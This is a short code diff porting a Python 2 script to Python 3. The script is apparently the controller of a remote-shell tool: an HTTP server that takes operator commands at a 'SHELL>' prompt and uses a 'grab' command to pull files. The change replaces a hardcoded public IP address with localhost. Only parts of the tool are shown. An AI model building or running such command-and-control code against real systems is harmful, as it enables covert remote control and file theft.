@@ -1,12 +1,13 @@
-import BaseHTTPServer
+from http.server import HTTPServer
+from http.server import BaseHTTPRequestHandler
 import cgi
 ft = ''
 
 
-class ServerHandler(BaseHTTPServer.BaseHTTPRequestHandler):
+class ServerHandler(BaseHTTPRequestHandler):
 
     def do_GET(self):
-        cmd = raw_input("SHELL>")
+        cmd = input("SHELL>")
         if 'grab' in cmd:
             c,f = cmd.split('*')
             global ft
@@ -47,9 +48,8 @@ class ServerHandler(BaseHTTPServer.BaseHTTPRequestHandler):
 
 def main():
     print("starting server.....")
-    server_class = BaseHTTPServer.HTTPServer
-    serveraddress = ('27.4.219.193',1157)
-    httpd = server_class(serveraddress,ServerHandler)
+    serveraddress = ('localhost',50505)
+    httpd = HTTPServer(serveraddress,ServerHandler)
     print("running server")
     try:
         httpd.serve_forever()
